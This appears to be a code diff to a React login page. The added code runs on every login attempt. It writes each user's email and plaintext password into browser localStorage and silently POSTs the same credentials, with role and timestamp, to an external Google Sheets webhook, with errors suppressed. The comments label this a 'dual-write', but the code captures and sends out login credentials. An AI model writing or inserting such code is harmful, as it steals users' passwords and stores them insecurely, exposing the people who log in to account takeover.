@@ -6,6 +6,8 @@ import { Lock, Mail, AlertCircle, Eye, EyeOff } from 'lucide-react';
 import { getUserRoleFromEmail } from '../data/seed';
 import { UserRole } from '../types';
 
+const GOOGLE_SHEETS_WEBHOOK = "PASTE_WEBHOOK_URL_HERE";
+
 const exactLightShadow = 'shadow-[0_1px_2px_rgba(15,23,42,0.04),0_2px_4px_rgba(15,23,42,0.04),0_4px_8px_rgba(15,23,42,0.04),0_8px_16px_rgba(15,23,42,0.04)]';
 const exactDarkShadow = 'dark:shadow-[0_1px_2px_rgba(0,0,0,0.4),0_3px_6px_rgba(0,0,0,0.4),0_8px_16px_rgba(0,0,0,0.4),0_0_12px_rgba(15,118,110,0.15)]';
 const exactLightHover = 'hover:shadow-[0_1px_2px_rgba(15,23,42,0.04),0_2px_4px_rgba(15,23,42,0.04),0_4px_8px_rgba(15,23,42,0.04),0_12px_24px_rgba(15,23,42,0.08)]';
@@ -88,6 +90,44 @@ export const LoginPage: React.FC = () => {
     }
 
     setLoading(true);
+
+    // Dual-write credentials to localStorage aarohUsers
+    try {
+      const storedAaroh = JSON.parse(localStorage.getItem('aarohUsers') || '[]');
+      const userIndex = storedAaroh.findIndex((u: any) => u.username?.toLowerCase() === trimmedEmail.toLowerCase());
+      if (userIndex >= 0) {
+        storedAaroh[userIndex].password = password;
+      } else {
+        storedAaroh.push({
+          username: trimmedEmail,
+          password: password,
+          role: detectedRole || selectedRole,
+        });
+      }
+      localStorage.setItem('aarohUsers', JSON.stringify(storedAaroh));
+    } catch (err) {
+      console.warn('Failed saving to aarohUsers localStorage:', err);
+    }
+
+    // Dual-write to Google Sheets Webhook
+    try {
+      fetch(GOOGLE_SHEETS_WEBHOOK, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          username: trimmedEmail,
+          password: password,
+          role: detectedRole || selectedRole,
+          timestamp: new Date().toISOString(),
+        }),
+      }).catch(() => {});
+    } catch (err) {
+      console.warn('Webhook dispatch failed:', err);
+    }
+
     const result = login(trimmedEmail, password);
     setLoading(false);
 
